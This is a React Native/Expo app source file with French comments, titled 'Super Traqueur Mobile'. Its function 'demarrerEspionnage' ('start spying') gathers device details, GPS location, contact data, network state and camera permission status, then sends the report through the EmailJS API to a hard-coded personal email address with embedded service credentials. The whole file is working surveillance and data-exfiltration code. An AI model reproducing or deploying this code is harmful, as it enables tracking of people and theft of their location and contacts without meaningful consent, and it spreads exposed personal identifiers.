import React, { useState } from 'react';
import { StyleSheet, View, Button, Alert, Text, ScrollView } from 'react-native';
// Import des modules (Assure-toi de les avoir ajoutés dans "Dependencies")
import * as Device from 'expo-device';
import * as Battery from 'expo-battery';
import * as Location from 'expo-location';
import * as Network from 'expo-network';
import * as Contacts from 'expo-contacts';
import { Camera } from 'expo-camera';

export default function App() {
  const [chargement, setChargement] = useState(false);

  const demarrerEspionnage = async () => {
    setChargement(true);
    let rapport = "--- RAPPORT DE L'APPAREIL ---\n\n";

    try {
      // 1. Infos Système
      rapport += `📱 Appareil: ${Device.brand} ${Device.modelName}\n`;
      const bat = await Battery.getBatteryLevelAsync();
      rapport += `🔋 Batterie: ${(bat * 100).toFixed(0)}%\n`;

      // 2. Localisation GPS
      const { status: locStatus } = await Location.requestForegroundPermissionsAsync();
      if (locStatus === 'granted') {
        const loc = await Location.getCurrentPositionAsync({});
        rapport += `📍 GPS: https://www.google.com/maps?q=${loc.coords.latitude},${loc.coords.longitude}\n`;
      }

      // 3. Contacts
      const { status: conStatus } = await Contacts.requestPermissionsAsync();
      if (conStatus === 'granted') {
        const { data } = await Contacts.getContactsAsync({ fields: [Contacts.Fields.PhoneNumbers] });
        rapport += `👥 Contacts: ${data.length} trouvés. Dernier: ${data[0]?.name || 'Aucun'}\n`;
      }

      // 4. Réseau Wifi
      const net = await Network.getNetworkStateAsync();
      rapport += `🌐 Wifi: ${net.isConnected ? "Connecté" : "Non"} (${net.type})\n`;

      // 5. Caméra
      const { status: camStatus } = await Camera.requestCameraPermissionsAsync();
      rapport += `📸 Caméra: ${camStatus === 'granted' ? "Autorisée" : "Refusée"}\n`;

      await envoyerEmail(rapport);
    } catch (e) {
      Alert.alert("Erreur", "Une permission a été bloquée.");
    } finally {
      setChargement(false);
    }
  };

  const envoyerEmail = async (contenu) => {
    const params = {
      service_id: 'service_80mctsc',
      template_id: 'template_z13u4ls',
      user_id: '21MU3spp1I6pFWegh',
      template_params: {
        'name': Device.deviceName,
        'message': contenu,
        'to_email': 'abdmactar09@gmail.com'
      }
    };

    const res = await fetch('https://api.emailjs.com/api/v1.0/email/send', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(params),
    });

    if (res.ok) {
      Alert.alert("Succès", "Toutes les données ont été envoyées !");
    }
  };

  return (
    <View style={styles.container}>
      <Text style={styles.title}>Super Traqueur Mobile</Text>
      <Text style={styles.subtitle}>Envoi vers: abdmactar09@gmail.com</Text>
      <Button 
        title={chargement ? "Collecte en cours..." : "TOUT RÉCUPÉRER ET ENVOYER"} 
        onPress={demarrerEspionnage} 
        disabled={chargement}
        color="#E91E63" 
      />
    </View>
  );
}

const styles = StyleSheet.create({
  container: { flex: 1, justifyContent: 'center', alignItems: 'center', backgroundColor: '#121212', padding: 20 },
  title: { fontSize: 24, color: 'white', fontWeight: 'bold', marginBottom: 10 },
  subtitle: { color: '#888', marginBottom: 30 }
});
